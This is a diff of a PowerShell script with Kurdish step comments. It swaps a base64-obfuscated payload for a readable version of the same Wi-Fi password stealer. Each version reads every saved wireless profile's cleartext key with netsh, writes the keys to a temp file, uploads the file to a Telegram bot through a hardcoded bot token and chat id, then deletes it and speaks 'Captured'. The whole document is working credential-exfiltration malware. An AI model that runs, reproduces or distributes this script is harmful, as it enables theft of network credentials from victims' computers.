@@ -1,3 +1,26 @@
-$b = "JHQ9IjgwNTU0Mzk4Nzc6QUFIcFB5eVk3OXB1dEx5eENEYTNiRUQ3S0h0RFdvMVQ4MCI7JGk9Ijg1OTc4MDUxNDQiOyRwPSIkZW52OlRFTVBcdy50eHQiO2lmKFRlc3QtUGF0aCAkcCl7cm0gJHAgLWZ9O25ldHNoIHdsYW4gc2hvdyBwcm9maWxlc3xTZWxlY3QtU3RyaW5nICJcOiguKykkiHwlIHskbj0kXy5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCk7JGM9bmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZT0iJG4iIGtleT1jbGVhcjskbT0kY3xTZWxlY3QtU3RyaW5nICJLZXkgQ29udGVudFxcVytcOiguKykkiDtpZigkbSl7JHBhc3M9JG0uTWF0Y2hlcy5Hcm91cHNbMV0uVmFsdWUuVHJpbSgpOyRuKyI6IitkcGFzc3xBYyAkcH19O2lmKFRlc3QtUGF0aCAkcCl7Y3VybC5leGUgLUYgImRvY3VtZW50RUBkcCIgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkdC9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD0kaSI7cm0gJHAgLWZ9OyRzPU5ldy1PYmplY3QgLUNvbU9iamVjdCBTQVBJLlNwVm9pY2U7JHMuU3BlYWsoIlBhc3N3b3JkcyBDYXB0dXJlZCIp"
-$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
-ExecutionContext.InvokeCommand.InvokeScript($s)
+# ۱. زانیارییەکان
+$t = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
+$i = "8597805144"
+$p = "$env:TEMP\w.txt"
+
+# ۲. کۆکردنەوەی ناوی وایفایەکان
+$w = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+
+# ۳. دۆزینەوەی پاسۆردەکان بە شێوەیەکی سادە
+foreach ($n in $w) {
+    $c = netsh wlan show profile name="$n" key=clear
+    $m = $c | Select-String "Key Content\W+\:(.+)$"
+    if ($m) {
+        $pass = $m.Matches.Groups[1].Value.Trim()
+        Add-Content -Path $p -Value "$n : $pass"
+    }
+}
+
+# ٤. ناردن بۆ تێلیگرام
+if (Test-Path $p) {
+    curl.exe -L -F "document=@$p" "https://api.telegram.org/bot$t/sendDocument?chat_id=$i"
+    Remove-Item $p -Force
+}
+
+# ٥. قسەکردن (ئارەزوومەندانە)
+(New-Object -ComObject SAPI.SpVoice).Speak("Captured")
